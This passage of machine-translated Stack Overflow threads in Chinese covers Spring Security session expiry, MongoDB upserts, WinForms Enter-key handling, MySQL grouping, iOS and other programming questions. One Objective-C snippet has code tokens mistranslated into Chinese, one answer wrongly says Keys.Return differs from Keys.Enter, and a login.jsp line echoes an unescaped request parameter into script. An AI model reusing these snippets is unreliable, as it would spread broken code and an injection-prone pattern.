>   <beans:property name="sessionRegistry" ref="sessionRegistry" />
>   <beans:property name="expiredUrl" value="/concurrent.htm?concurrencyError=true" />
>   <beans:property name="redirectStrategy" ref="customForwardStrategy" /> 
> ```

但问题是它被重定向到“login.htm”，而与“expiredUrl”中定义的值无关。我调试并发现根本原因是，首先我的转发到 concurrent.htm 的请求发生在 concurrencySessionFilter 中，但是在该过滤器链序列继续之后，由于会话在身份验证链中将为空，它被重定向到“loginFormUrl”，即， login.htm（此特定请求出现在 ExceptionTranslationFilter 中的 handleException() 方法 -> 在下面显示的行处 @sendStartAuthentication

```
else if (exception instanceof AccessDeniedException) {
        if   (authenticationTrustResolver.isAnonymous(SecurityContextHolder.getContext().getAuthentication())) {
            if (logger.isDebugEnabled()) {
                logger.debug("Access is denied (user is anonymous); redirecting to authentication entry point",
                        exception);
            }

            sendStartAuthentication(request, response, chain, new InsufficientAuthenticationException(
                    "Full authentication is required to access this resource"));) 
```

所以我之前对“concurrent.htm”的请求被下一个请求“login.htm”覆盖，并且我被重定向到登录页面而不是 concurrency.jsp 页面。

一旦并发过滤器中发生并发错误，我是否需要添加任何配置以停止进一步过滤，以便我可以重定向/转发到我配置的页面？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T13:02:01.973

我找到了问题的根本原因。

## 根本原因：

问题不在于 spring 3.0.5 版本或某些配置。这一切都归功于我的一个 js 文件中的一小段代码：

```
/* session timeout handling */
Ext.Ajax.on("requestcomplete", function(conn, response, options){
    //We can do nicer things here, like showing a login window and let
    //the user login on the same screen. But now we simply redirects the
    //user to the login page.
 if(response.responseText.indexOf("<html>") > 0){
    window.location = mFino.BASE_URL + "login.htm";
 }
}); 
```

这里要做的是：由于我们的网站完全是使用 extjs 构建的，我们确实发送了 ajax 请求，所以如果我们发送一个 ajax 请求，让我们说“fix.htm”（一旦用户一次登录多个系统），序列过滤器被调用，当 ConcurrentSessionFilter 被调用时，重定向发生在“concurrent.jsp”并且过滤被终止（当然，正如我所说的，当一次发送多个请求时，即使在并发过滤器中发生重定向并且过滤器被终止，另一个请求将通过定义的过滤器，而不管第一个请求是否被重定向 - 然后在异常过滤器中引发 AccessDeniedException 并重定向到 login.htm 并行发生 - 但这不是根本原因，因为即使只有 1 ajax 请求已发送）所以最后是并发的。jsp 内容作为对 ajax 请求的响应发送。

内容（即 response.responseText 中的

```
 Ext.Ajax.on("requestcomplete", function(conn, response, options)) 
```

将是一个类似于...的html页面

```
"<html>
    <head>
        <title>Adminapplication- concurrency issue page</title>......." 
```

由于满足条件，用户将根据代码重定向到登录页面：

```
 if(response.responseText.indexOf("<html>") > 0){
     window.location = mFino.BASE_URL + "login.htm";
 } 
```

保持此条件的目的是：通常，ajax 请求的响应将是 JSON 或 XML 类型的示例，例如：

```
 {success:true, message:'User name is xxx'} 
```

所以如果有的话，如果他们得到除了这种类型的响应（比如 html 响应），可以说是由于会话超时，他们只是重定向到**login.htm**。

这是影响我重定向到“ **concurrent.htm** ”的根本原因。

## 我为此想出的解决方案是：

**将concurrenyHandler**中的逻辑更改为发送 json 响应，而不是重定向到**并发 jsp**，这将生成 html 响应 ...如下：

前：

```
@RequestMapping("/concurrent.htm")

public View concurrenyHandler(HttpServletRequest request, HttpServletResponse response){
        return new ModelAndView("concurrent");
    } 
```

后：

```
@RequestMapping("/concurrent.htm")

public View concurrenyHandler(HttpServletRequest request, HttpServletResponse response){
        HashMap<String,Object> map = new HashMap<String, Object>();
        map.put("success", true);
        map.put("Error", MessageText._("Session Expired"));
        return new JSONView(map); //JSONView is our custom class which implements org.springframework.web.servlet.View and renders json object as string just like ..."out.write(this.jsonObject.toString());"
     } 
```

在 js 文件中，将“on **requestcomplete** ”功能更改如下，

```
/* session timeout handling */
Ext.Ajax.on("requestcomplete", function(conn, response, options){
    //We can do nicer things here, like showing a login window and let
    //the user login on the same screen. But now we simply redirects the
    //user to the login page.
    /*if(response.responseText.indexOf("<html>") > 0){
    window.location = mFino.BASE_URL + "login.htm";
    }*/
 if(response.responseText.indexOf("Session Expired") > 0){
    window.location = mFino.BASE_URL + "login.htm?sessionExpired=true";
 }
}); 
```

在 login.jsp 中，我将检查 sessionExpired=true 条件并使用以下消息发出警报，

```
if('<%=request.getParameter("sessionExpired")%>'=='true'){
    alert("The session is expired due to timeout or because the same user logged in on another system");
} 
```

更改弹簧设置如下：

```
 .......<custom-filter position="CONCURRENT_SESSION_FILTER" ref="concurrencyFilter" />
    <custom-filter ref="authenticationProcessingFilter" before="FORM_LOGIN_FILTER" />        
    <custom-filter ref="customSessionManagementFilter" after="SESSION_MANAGEMENT_FILTER" />

    <session-management session-authentication-strategy-ref="sas" invalid-session-url="/concurrent.htm"/>
</http>

<beans:bean id="authenticationProcessingFilter" class="com.mfino.uicore.security.AuthProcessingFilter">
    <beans:property name="authenticationManager" ref="authenticationManager" />
    <beans:property name="sessionAuthenticationStrategy" ref="sas" />
</beans:bean>

 <beans:bean id="customSessionManagementFilter" class="com.mfino.uicore.security.CustomSessionManagementFilter">
</beans:bean>

<beans:bean id="concurrencyFilter"
    class="org.springframework.security.web.session.ConcurrentSessionFilter" >
    <beans:property name="sessionRegistry" ref="sessionRegistry" />
    <beans:property name="expiredUrl" value="/concurrent.htm" />
</beans:bean>.......... 
```

现在，当根据需要发生并发异常时，我可以在登录页面中显示带有消息的警报[以前我担心的主要问题是我无法发送像'sessionExpired = true'这样的请求参数来检查登录页面中的条件并发出警报，因为我不断地被重定向到 login.htm（没有任何此类请求参数），而不管 Spring 处理程序完成的重定向]。

感谢@LukeTaylor 指导我！！！！

# jira - JIRA（Greenhopper）如何在后面添加故事（如果已经完成）？

> ID：12318145
> 
> 赞同：1
> 
> 时间：2012-09-07T12:30:15.677
> 
> 标签：jira, greenhopper

您能否给我提示 - 如何在背后添加故事？我已经在这个项目上工作了一段时间，我们决定开始使用 JIRA。所以目前我已经完成了一些任务（故事）。我想过去将它们添加到 JIRA (Greenhopper)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T19:27:23.173

[我在这里](https://answers.atlassian.com/questions/81654/how-do-i-create-a-sprint-in-the-past)找到了如何做到这一点。引用以防万一由于某些原因它会在原始页面上被删除：

*问题：*

> 我已经从另一个系统导入了我的用户故事，但我似乎无法将它们添加到过去的 sprint 中。我收到错误：“您必须指定一个不是过去的开始日期。”。如何解决此问题以导入过去的 sprint？

*回答：*

> **创建一个不在过去的冲刺。**将您的任务拖入上述冲刺中。**更新说 sprint 是过去的日期。**关闭说冲刺。

# mongodb - MongoDB-upsert：一劳永逸

> ID：12318147
> 
> 赞同：1
> 
> 时间：2012-09-07T12:30:22.157
> 
> 标签：mongodb

我知道 MongoDB 在插入/更新/删除文档时默认使用异步写入。我的问题是这些更新是否仍按顺序执行。

让我们假设以下 upsert 查询后跟一个删除查询：

```
db.servers.update({ "server": "abcdef" }, { "$set": { "lastSeen": new Date()}}, /*upsert=*/ true);
db.servers.update({ "server": "uvwxyz" }, { "$set": { "lastSeen": new Date()}}, /*upsert=*/ true);
db.servers.remove({ "lastSeen": { "$lt": new Date(Date.now() - 3600000) }  }); 
```

如果这些命令按这些顺序执行，那么保证（如果操作成功）首先插入/更新两个文档，然后删除操作将删除过时的文档？我希望插入/删除的文档都不会被删除，因为它们的“lastSeen”值已更新。

我认为“异步写入”只与数据从 RAM 写入磁盘的时间有关。我认为它不会影响命令的顺序，因此上面的示例将始终有效（如果更新成功），对吧？

编辑：我使用单个 mongod 实例。没有副本集，没有分片:-)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:49:25.297

通过单个连接发送的命令被序列化。因此，如果您确实通过一个连接发送它们，则可以保证这`remove`将在两次插入之后发生。

异步写入（AKA “即发即弃”）意味着客户端库不等待写入确认。它只是将插件吐入插座并忘记它。如果在应用此插入时存在唯一索引违规（例如），您将永远不会知道。

**顺便说一下**，你可以使用 mongodb 的最新特性：[TTL 索引](http://docs.mongodb.org/manual/tutorial/expire-data/)！MongoDB 会自行删除陈旧的数据，您只需继续插入 :)

# c# - Winrt 中的 Bing 地图

> ID：12318161
> 
> 赞同：2
> 
> 时间：2012-09-07T12:31:05.560
> 
> 标签：c#, windows-8, windows-runtime, bing-maps

我有一张地图和 15000 个图钉形式的点要添加到地图中。

我正在做的是，如果该点位于可见区域中，我将其添加到 MapLayer 并将图层添加到地图对象。

这工作正常，但平移不是那么顺利。

我尝试使用 IAsyncOperation 创建 MapLayer，但我们无法在 IAsyncOperation 中操作或创建 UIElement。

有没有办法在后台创建一个 Maplayer 并替换当前的 maplayer。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:13:19.543

您是否尝试过将 pin 集合绑定到 a `MapItemsControl`？这应该提供您需要的 UI 虚拟化，以使滚动更流畅。

例子

XAML

```
<bm:Map Name="MainMapView" Credentials="{StaticResource BingMapsApiKey}" Margin="0">
    <bm:MapItemsControl ItemsSource="{Binding MyPoints}" ItemTemplate="{StaticResource MyItemTemplate}" />
</bm:Map> 
```

您的点集合在哪里`MyPoints`，可在您的视图模型中访问

# android - 为什么 SystemClock.sleep(x) 会阻止 AppWidget 的更新？

> ID：12318162
> 
> 赞同：0
> 
> 时间：2012-09-07T12:31:12.570
> 
> 标签：android, service, widget, sleep, appwidgetprovider

我从服务中更新 AppWidget 时遇到问题。这个问题对我来说似乎完全不合逻辑，所以我创建了一个 TestService 来查找错误。这是我使用的测试布局：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical" >
    <TextView android:id="@+id/testText"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:text="Hello World"/>
</LinearLayout> 
```

`onStart(Intent, startid)`实现如下：

```
@Override
public void onStart(Intent intent, int startId) {
    super.onStart(intent, startId);
    Log.d(TAG, "onStart Service with StartId: " + startId);
    mStartId = startId;

    int widgetId = AppWidgetManager.INVALID_APPWIDGET_ID;
    if (intent != null && intent.hasExtra(AppWidgetManager.EXTRA_APPWIDGET_ID)){
        widgetId = intent.getIntExtra(AppWidgetManager.EXTRA_APPWIDGET_ID,
                                      AppWidgetManager.INVALID_APPWIDGET_ID);
    }

    if (widgetId == AppWidgetManager.INVALID_APPWIDGET_ID){
        Log.d(TAG, "invalif AppWidgetId");
        stopSelf();
    }

    RemoteViews mRemoteViews = new RemoteViews(getPackageName(), R.layout.testlayout);
    mRemoteViews.setTextViewText(R.id.testText, "someText");
    AppWidgetManager.getInstance(this).updateAppWidget(widgetId, mRemoteViews);

    SystemClock.sleep(1000);
    mRemoteViews.setTextViewText(R.id.testText, "text after delay");
    AppWidgetManager.getInstance(this).updateAppWidget(widgetId, mRemoteViews);
} 
```

在此实现中，生成的小部件始终具有文本：“someText”，但在我看来，它应该是“延迟后的文本”。如果我删除该行，`SystemClock.sleep(1000)`我会得到“延迟后的文本”。为什么是这样？（在三星 Galaxy Nexus (4.1.1) 上测试

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T14:31:55.180

我发现，它可以被认为是我的手机（GalaxyNexus）上发生的一个错误。重新启动手机以某种方式修复了它。就像在“美好的旧”Windows 时代一样，“您是否尝试过打开和关闭它”

# c# - 在 C# 中输入按键

> ID：12318164
> 
> 赞同：68
> 
> 时间：2012-09-07T12:31:19.560
> 
> 标签：c#, .net

我试过这段代码：

```
private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
{
    if (Convert.ToInt32(e.KeyChar) == 13) 
    {
        MessageBox.Show(" Enter pressed ");
    }
} 
```

还有这个：

```
private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
{
    if (e.KeyChar == Convert.ToChar(Keys.Enter))
    {
        MessageBox.Show(" Enter pressed ");
    }
} 
```

还有这个：

```
private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
{
    if (e.KeyChar == Keys.Enter)
    {
        MessageBox.Show(" Enter pressed ");
    }
} 
```

但他们没有工作......

当我写东西并按`Enter`时，它不起作用。它只突出显示我的文字。

* * *

## 回答 #1

> 赞同：109
> 
> 时间：2012-09-07T12:34:51.997

试试这个代码，可能会工作（假设是windows形式）：

```
private void CheckEnter(object sender, System.Windows.Forms.KeyPressEventArgs e)
{
    if (e.KeyChar == (char)13)
    {
        // Enter key pressed
    }
} 
```

像这样注册事件：

```
this.textBox1.KeyPress += new 
System.Windows.Forms.KeyPressEventHandler(CheckEnter); 
```

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-09-07T12:44:53.647

您必须在 keydown 事件中尝试此操作

这是代码：

```
private void textBox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
        {
            MessageBox.Show("Enter pressed");
        }
    } 
```

更新 ：

您也可以使用按键事件来做到这一点。

试试这个 ：

```
private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (e.KeyChar == Convert.ToChar(Keys.Return))
        {
            MessageBox.Show("Key pressed");
        }
    } 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-08-07T07:06:43.553

```
private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
{
    if (e.KeyChar == (char)Keys.Enter)
    {
        MessageBox.Show("Enter Key Pressed");
    }
} 
```

这使您可以选择所需的特定密钥，而无需找到密钥的 char 值。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-07-27T18:42:48.830

```
private void textBoxKontant_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                MessageBox.Show("Enter pressed");
            }
        } 
```

截屏：

![](../Images/06c85349ab7b4a75164d1f68901c0ae0.png)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-03-15T14:09:37.977

KeyChar 是在寻找一个整数值，所以需要进行如下转换：

```
 private void Form1_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (e.KeyChar == Convert.ToInt16(Keys.Enter))
        {
            MessageBox.Show("Testing KeyPress");
        }
    } 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-11-27T05:46:41.187

您可以使用 Key_down 事件，而不是使用 Key_press 事件。双击此处后，您可以找到如下所示，它会自动显示此代码[![事件](../Images/60f7d8c7b921cf09d09f998e7dbf2480.png)](https://i.stack.imgur.com/55DA4.jpg)

```
private void textbox1_KeyDown(object sender, KeyEventArgs e)
    {

     } 
```

现在解决的问题随心所欲地使用。

```
private void textbox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Enter)
        {
            MessageBox.Show(" Enter pressed ");
        }
     } 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-08-02T12:28:37.817

```
private void TextBox1_KeyUp(object sender, KeyEventArgs e)
{
     if (e.KeyCode == Keys.Enter)
     {
         MessageBox.Show("Enter pressed");
     }
 } 
```

为我工作。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-01-04T11:44:53.697

```
private void Input_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Return)
        {
            MessageBox.Show("Enter pressed");
        }
    } 
```

这对我有用。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-10-01T07:13:32.430

您也可以使用按键事件来做到这一点。

```
 private void textBox1_EnterKeyPress(object sender, KeyEventArgs e)

 {

  if (e.KeyCode == Keys.Enter)
   {
     // some code what you wanna do
   }

} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-07-21T18:51:24.427

对我来说，这是最好的解决方案：

```
private void dataGridView1_KeyDown(object sender, KeyEventArgs e)
{
    if (e.KeyData == Keys.Enter)
    {
        MessageBox.Show("Enter key pressed");
    }
} 
```

![结果](../Images/336670adb7dae1c48d472571a9cdb799.png)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-10-14T12:27:05.963

请记住，

**Keys.Return**与**Keys.Enter不同**

```
//Makes it easier to Type user and password and press Enter, 
//Rather than using the mouse to Click the Button all the time
    private void Txt_Password_KeyDown(object sender, KeyEventArgs e)
    {
        if(e.KeyCode == Keys.Return)
        {
            Btn_Login_Click(null, null);
        }
    } 
```

希望这对某人有所帮助。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2019-11-06T00:45:25.053

```
private void Ctrl_KeyUp(object sender, KeyEventArgs e)
{
    if (e.KeyCode == Keys.Enter)
    {
        this.SelectNextControl((Control)sender, true, true, true, true);
    }
} 
```

选择所有需要的文本框；输入新的事件名称 Ctrl_KeyUp。

通过 BTNT TV 观看 YouTube： [https ://www.bing.com/videos/searchq=c%23+how+to+move+to+next+textbox+after+enterkey&view=detail&mid=999E8CAFC15140E867C0999E8CAFC15140E867C0&FORM=VIRE](https://www.bing.com/videos/searchq=c%23+how+to+move+to+next+textbox+after+enterkey&view=detail&mid=999E8CAFC15140E867C0999E8CAFC15140E867C0&FORM=VIRE)

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2015-12-11T06:57:21.523

您可以使用以下代码：

```
abc_KeyDown(abc, new KeyEventArgs(Keys.Enter)); 
```

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2012-09-07T12:35:08.650

试试这个：

```
private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
{
        switch (e.Key.ToString())
        {
                case "Return":
                        MessageBox.Show(" Enter pressed ");
                        break;
         }
} 
```

# mysql - SINGLE 列上的多行 SELECT 查询

> ID：12318167
> 
> 赞同：2
> 
> 时间：2012-09-07T12:31:47.253
> 
> 标签：mysql, database-design

在我的 MySQL 数据库中，我有两个这样的列设置（例如）：

```
series_id   category_id
    1            1
    1            2
    1            3
    2            1
    2            3
    3            2
    4            1
    4            2 
```

当 category_id = 1 和 2 时，我可以用来选择 series_id 的正确选择查询是什么？

当前查询是这样的：

```
SELECT series_id 
FROM table 
WHERE category_id = '1' 
OR category_id = '2' 
GROUP BY series_id" 
```

这不会检索任何结果：

```
SELECT series_id 
FROM table 
WHERE category_id = '1' 
AND category_id = '2' 
GROUP BY series_id 
```

关于此示例，我希望它返回 series_id 为 1 和 2 的两行，因此结果如下所示：

```
series_id
     1
     4 
```

（可选/奖励）如果可以提出其他解决方案或利用：

```
GROUP_CONCAT(category_id SEPARATOR ', ') AS category 
```

对于此查询返回的 series_id (s)，因此返回的结果是：

```
series_id    category
     1       1, 2, 3
     4       1, 2 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T12:33:59.837

```
SELECT   series_id
FROM     my_table
WHERE    category_id IN (1,2)
GROUP BY series_id
HAVING   COUNT(*) = 2 
```

在[sqlfiddle](http://sqlfiddle.com/#!2/07bde/1/0)上查看。

请注意，如果`(series_id, category_id)`不能保证是唯一的，则应替换`COUNT(*)`为性能较差的`COUNT(DISTINCT category_id)`.

要返回分组结果，您可以再次加入您的表：

```
SELECT series_id, GROUP_CONCAT(category_id)
FROM   my_table NATURAL JOIN (
  SELECT   series_id
  FROM     my_table
  WHERE    category_id IN (1,2)
  GROUP BY series_id
  HAVING   COUNT(*) = 2
) t
GROUP BY series_id 
```

在[sqlfiddle](http://sqlfiddle.com/#!2/07bde/2/0)上查看。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:36:03.710

您需要`SubQuery`获取`series_id``GROUP_CONCAT.

```
SELECT series_ID, GROUP_CONCAT(category_id)
FROM tableName
WHERE series_ID IN
        (
            SELECT series_id
            FROM tableName
            WHERE Category_ID IN (1,2)
            GROUP BY seriesID
            HAVING COUNT(series_id) = 2
        )
GROUP BY series_ID 
```

# [*SQLFiddle 演示*](http://sqlfiddle.com/#!2/ec0e5/3)

希望这对您有所帮助。

![在此处输入图像描述](../Images/34ae99f09eaa318b4214149a0f3766fe.png)

# python - 在缩放（例如视网膜）显示器上使用 Python/tkinter 显示图像

> ID：12318172
> 
> 赞同：1
> 
> 时间：2012-09-07T12:32:02.470
> 
> 标签：python, tkinter, retina-display

当显示来自 python/tkinter 的图像时，使用如下代码：

```
self.label = tk.Label(self.root, image=image)
self.label.pack() 
```

图像在 MBP 视网膜上出现像素化，即在每个轴上像素加倍。

有没有办法说服 tkinter 以“本机”分辨率显示图像？如果没有，还有哪些其他解决方案可以显示图像？当然，图像可以保存在其他地方查看，但我在使用 GUI 选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T00:23:32.037

如果您使用 Tk 的 Cocoa 版本（例如 ActiveState 版本），您可能可以在程序的 plist 中添加一些内容，请参阅： [https ://developer.apple.com/library/mac/#documentation/GraphicsAnimation /Conceptual/HighResolutionOSX/Explained/Explained.html#//apple_ref/doc/uid/TP40012302-CH4-SW10](https://developer.apple.com/library/mac/#documentation/GraphicsAnimation/Conceptual/HighResolutionOSX/Explained/Explained.html#//apple_ref/doc/uid/TP40012302-CH4-SW10)

`NSHighResolutionCapable`是的

但不确定它是否有效。

如果您仍然使用旧的基于 Carbon 的版本，它将无法正常工作。

# android - 如何集成 ViewPagerExtensions 库 android

> ID：12318173
> 
> 赞同：0
> 
> 时间：2012-09-07T12:32:07.850
> 
> 标签：android, layout

任何示例/参考将不胜感激

库链接[https://github.com/astuetz/ViewPagerExtensions](https://github.com/astuetz/ViewPagerExtensions)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:38:54.057

这是一个包含示例代码的[zip 文件。](https://github.com/downloads/astuetz/ViewPagerExtensions/ViewPagerExtensions-Example_1.zip)该链接可在此处找到：[https ://github.com/astuetz/ViewPagerExtensions](https://github.com/astuetz/ViewPagerExtensions)

# iphone - 多语言应用程序与许多应用程序

> ID：12318175
> 
> 赞同：0
> 
> 时间：2012-09-07T12:32:12.713
> 
> 标签：iphone, ios, internationalization, app-store

**问题：**我正在为 iPhone 制作游戏应用程序。我已经在 App Store 中有这个应用程序（用我的语言 - 波兰语），但我正在开发德语和英语版本。这个应用程序有大量依赖于语言的图像/声音。如果它只是字符串，这将很容易，但图像/声音更...

我看到它的方式有两个选择：
1）使用本地化内容更新 App Store 中的应用程序 - 但它最终会使我的应用程序大 2-3 倍。我不认为人们会如此渴望下载 60mb 的应用程序而不是 15mb...
2) 制作 3 个具有相同（？）名称的应用程序，但每种语言的内容不同 - 我不确定 App Store 会接受此方法，但应用会更轻

**问题：**有人知道如何解决这样的问题吗？选项 1 或 2？或者也许还有其他事情要做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:41:57.490

当您的应用程序首次启动时，您可以下载当前语言的语言文件（声音、图像等）。如果用户更改了他的语言，您可以重新下载新语言的所有图像和声音，并将它们都存储在设备上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:38:54.400

我更喜欢选项#1。当我下载游戏时，我不关心游戏是 15 MB 还是 60 MB。

至于选项＃2，我不确定您是否可以创建多个具有相同名称的应用程序。

通常用户不应该关心他们正在下载哪个版本。这确实是我目标的转折点。让用户在应用程序中选择语言。

也许您应该研究一下您的图像和声音是否可以进一步压缩？

我不太喜欢游戏开发，但这只是我的 50 美分。

# iphone - 调用类时收到 NSInvalidArgumentException

> ID：12318176
> 
> 赞同：0
> 
> 时间：2012-09-07T12:32:13.323
> 
> 标签：iphone, objective-c, ios5

我只是在学习 Objective-c，我正在尝试创建一个以 MySQL Timestamp 格式生成当前日期的类。代码编译得很好，但我收到以下错误。

```
012-09-07 08:21:00.368 jsonclient[6831:f803] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '+[getcurrenttime toString]: unrecognized selector sent to class 0x36a9c' 
```

我确定这是一个简单的答案，但我自己一直找不到。这是我对类的调用，然后是标题和 .m 文件。

```
NSString* CurrentDate = [getcurrenttime toString];

#import <UIKit/UIKit.h>

@interface getcurrenttime : NSObject {
    NSString *toString;
}

+(NSString*) toString;

@end

#import "getcurrenttime.h"

@implementation getcurrenttime

- (id)init
{
    self = [super init];
    if (self) {
        // Initialization code here.
    }

    return self;
}

- (NSString*) toString {

    NSDate *now =[NSDate date];
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    toString = [formatter stringFromDate:now];

    return toString;
}
@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:36:44.070

您的类的接口和实现之间存在不匹配。最简单的解决方案是更改以下行：

```
+ (NSString*) toString 
```

请注意，`+`instead of`-`表示一个类方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:37:36.307

您必须首先初始化对象。

```
getcurrenttime *objGetTime = [[getcurrenttime alloc] init];

```

然后调用它的方法...

```
NSString* CurrentDate = [objGetTime toString];

```

你已经完成了，你想要一个全局方法来调用......

```
NSString* CurrentDate = [getcurrenttime toString];

```

但在 getcurrenttime.m 文件中放置“-”而不是“+”。

```
+ (NSString*) toString
{
    NSDate *now =[NSDate 日期];
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [格式化程序 setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    NSString *toString = [格式化 stringFromDate:now];
    返回字符串；
}

```

# php - 为什么大部分网站的用户头像图片文件的url都这么复杂？

> ID：12318184
> 
> 赞同：2
> 
> 时间：2012-09-07T12:32:47.883
> 
> 标签：php, database-design, profile, avatar

我发现大部分用户头像图片文件的url都很长，并且结合了很多数据。

例如，脸书：

```
https://fbcdn-profile-a.akamaihd.net/hprofile-ak-ash4/371533_1567227XXX_1135411XXX_q.jpg 
```

我们知道`1135411XXX`用户 id 和`q`文件大小，但是`371533`和`1567227XXX`代表什么？

其他：

领英`http://m3.licdn.com/mpr/mpr/shrink_60_60/p/4/000/165/0e4/3b2dcXX.jpg`

棒棒哒`http://24.media.tumblr.com/avatar_4de452cedeXX_64.png`

我们可以通过用户 id 来命名文件名，它看起来更短更容易，如下所示：

`<img src="http://domain.com/images/avatar/' . $user_id . '.jpg"/>`

但为什么他们让网址如此长而复杂？我没有考虑什么样的潜在问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:40:01.510

它们是复杂的系统，并且可能对头像图片有很多用途。也许在不同的地方他们需要不同的尺寸。也许他们需要一个只能从他们的网站访问的网址。

也许他们需要一个唯一生成的 url，以便可以从服务器静态提供文件，从而减少负载。

Twitter 的 url 看起来很简单，真的。有 cdn 域，然后`avatar_`是唯一的 id，然后是图像大小（即`_64`）。

Linkedin 似乎在 url 中有调整大小的参数，以启用不同的大小，然后是一些我不知道的其他参数，然后又是一个唯一的 id。

Facebook 有三个唯一标识来生成文件名，我认为他们会再次这样做，以便他们可以快速提供静态文件。我猜其中一个是专辑 ID，一个是个人资料 ID，最后一个可能是图片 ID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:41:02.687

可能有多种原因：

1.  反矿工
2.  安全槽默默无闻
3.  生成的 UID
4.  大小和像素等额外信息

想象一下，如果我知道您使用 5 个字符 ID 会发生什么，我将开始在您的服务器上加载所有可能的 ID，并完全从您的用户那里挖掘所有图片。

你会有很多流量。您的用户会起诉您不保护他们的隐私。

例如，为用户“userone”的这种路径提供一个哈希算法是很好的，哈希将是“1236662231”并将其用作路径，这样其他人就很难理解实际路径并且不会挖掘您的网站信息和图片。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:35:50.543

保存照片时，通常会为其生成一个 GUID。

GUID 由数字、字母和符号组成。它们通常足够长，以便可以存储足够数量的图像。它们也是独一无二的，因此图像大小和用户 ID 是不够的。

GUID 通常是根据上传时间生成的。与用户 ID 一起，这保证了唯一性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T12:38:56.337

*   url 可能有图片 ID 或专辑 ID 或用户 ID，或者可能是时间戳（在 int 中，以便图像不会以相同的名称缓存）
*   该域很复杂，因为 Facebook 的内容交付网络是 akamaihd，因此对其他人可能有不同...

# objective-c - 如何使用 UISilder 在 SubView 中添加和删除 UIButtons？

> ID：12318185
> 
> 赞同：2
> 
> 时间：2012-09-07T12:32:51.903
> 
> 标签：objective-c, ios, cocoa-touch, uibutton, uislider

我有一个`subview`几乎是我的主视图的一半，我的主视图也有一个`UISlider`。我的silder的值从 0 到 10。我想用 . 添加一些`UIButton`s值 4 然后我想从 Subview 中删除以前的 s 并将一些新的 s 添加到 Subview 。`Subview``UISilder``UIButton``UIButton``UIButton`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:48:45.680

注意：代码未经测试。

1.  启动 10`UIButton`并将它们添加到视图中，将它们设置为隐藏：

    ```
    for (int x = 0; x < 10; x++) {
        UIButton *btn = [[UIButton alloc] initWithFrame:CGRectMake(50, x * 100, 100, 50)];
        [btn setText:[NSString stringWithFormat:@"Button %d",(x + 1)]];
        [btn setHidden:true];
        [self.view addObject:btn];
        [btn release];
    } 
    ```

2.  使用滑块更改值方法来隐藏/显示按钮，如下所示：

    ```
     -(IBAction) sliderChanged:(id) sender{
              UISlider *slider = (UISlider *) sender;
              for (int x = 0; x < slider.value; x++) {
                   UIButton *btn = (UIButton *)[savedBtn objectAtIndex:x];
                   [btn setHidden:false];
              }
        } 
    ```

**更新**

要使用 a `UIScrollView`，您必须将`UIButton`s 添加到 scrollView 而不是视图，如下所示：

```
 UIScrollView *sView = [[UIScrollView alloc] initWithFrame:CGRectMake(10,10,200,200)];
    [sView setDelegate:self];
    for (int x = 0; x < 10; x++) {
        UIButton *btn = [[UIButton alloc] initWithFrame:CGRectMake(50, x * 100, 100, 50)];
        [btn setText:[NSString stringWithFormat:@"Button %d",(x + 1)]];
        [btn setHidden:true];
        [sView addSubview:btn];
        [btn release];
    } 
```

然后将scrollView添加到视图中：

```
 [self.view addSubview:sView]; 
```

希望这可以帮到你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:49:00.823

首先，您将选择器方法添加到您的`UISlider`,

```
